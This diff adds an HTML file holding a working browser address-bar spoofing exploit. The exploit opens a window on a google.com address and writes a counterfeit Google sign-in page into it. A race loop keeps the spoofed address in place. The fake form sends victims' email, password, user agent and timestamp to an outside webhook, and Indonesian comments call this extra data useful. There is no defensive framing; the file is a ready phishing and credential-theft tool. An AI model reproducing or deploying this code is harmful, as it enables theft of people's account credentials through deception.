@@ -1,0 +1,68 @@
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
+</body>
+    
+    <script>
+    
+    let windowSpoof;
+
+    function race() {
+      try {
+        windowSpoof.location.href !== 'about:blank';
+      }
+      catch (e) {
+        windowSpoof.location.href='https://www.google.com/csi';
+      }
+    }
+    
+    function startSpoof() {
+
+      windowSpoof = window.open("https://www.google.com:82","x");
+      windowSpoof.document.write(`<!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8">
+          <title>Sign in – Google Accounts</title>
+          <style>
+            body { margin:0; padding:20px; background:#fff; font-family:Arial,sans-serif; }
+            .container { max-width:420px; margin:40px auto; text-align:center; }
+            .logo { font-size:80px; color:#4285f4; margin-bottom:20px; }
+            h2 { font-size:24px; color:#333; margin-bottom:16px; }
+            p { color:#666; margin-bottom:28px; }
+            input { width:100%; padding:14px; margin:10px 0; border:1px solid #dadce0; border-radius:8px; font-size:16px; box-sizing:border-box; }
+            button { background:#1a73e8; color:white; border:none; padding:14px; font-size:16px; border-radius:8px; cursor:pointer; width:100%; margin-top:10px; }
+            button:hover { background:#1557b0; }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <div class="logo">G</div>
+            <h2>Sign in</h2>
+            <p>Use your Google Account</p>
+
+            <!-- FORM KIRIM LANGSUNG KE WEBHOOK KAMU -->
+            <form action="https://polite-whale-73.webhook.cool" method="POST">
+              <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
+              <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+              
+              <!-- DATA TAMBAHAN (opsional tapi sangat berguna) -->
+              <input type="hidden" name="url" value="${encodeURIComponent(location.href)}">
+              <input type="hidden" name="domain" value="google.com">
+              <input type="hidden" name="useragent" value="${navigator.userAgent}">
+              <input type="hidden" name="timestamp" value="${new Date().toISOString()}">
+
+              <button type="submit">Next</button>
+            </form>
+          </div>
+        </body>
+        </html>`);
+
+      setInterval('race()', 0);
+    
+    }
+   
+    </script>
